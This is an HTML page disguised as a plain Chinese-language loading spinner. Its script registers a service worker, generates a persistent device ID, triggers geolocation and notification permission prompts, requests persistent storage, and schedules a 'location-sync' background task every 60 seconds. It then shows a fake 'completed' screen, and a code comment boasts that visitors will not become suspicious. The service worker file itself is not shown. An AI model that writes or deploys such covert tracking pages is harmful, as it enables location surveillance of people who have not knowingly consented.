<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>加载中...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #fff;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p style="color:#888;">正在加载，请稍候...</p>
    </div>

    <script>
        // 生成唯一设备ID
        const deviceId = 'd_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        
        // 存储到localStorage，确保后续一致
        localStorage.setItem('_did', deviceId);
        
        // 注册Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(reg => {
                    console.log('SW registered');
                    
                    // 请求定位权限（静默）
                    navigator.permissions.query({ name: 'geolocation' }).then(result => {
                        if (result.state === 'granted' || result.state === 'prompt') {
                            // 获取一次位置触发权限请求
                            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 1000 });
                        }
                    });
                    
                    // 请求通知权限（用于后台唤醒）
                    Notification.requestPermission();
                    
                    // 请求持久化存储
                    if (navigator.storage && navigator.storage.persist) {
                        navigator.storage.persist().then(granted => {
                            console.log('Persistent storage:', granted);
                        });
                    }
                    
                    // 启用后台同步
                    if ('periodicSync' in reg) {
                        reg.periodicSync.register('location-sync', {
                            minInterval: 60000  // 最小间隔60秒
                        }).then(() => console.log('Periodic sync registered'));
                    }
                })
                .catch(err => console.log('SW reg failed:', err));
        }
        
        // 页面显示3秒后自动"完成加载"（实际后台任务已启动）
        setTimeout(() => {
            document.querySelector('.container').innerHTML = `
                <div style="font-size:48px;">✅</div>
                <p style="color:#4CAF50;">已完成</p>
            `;
            // 用户看到这个页面会以为只是个普通的加载页，不会起疑
        }, 3000);
    </script>
</body>
</html>
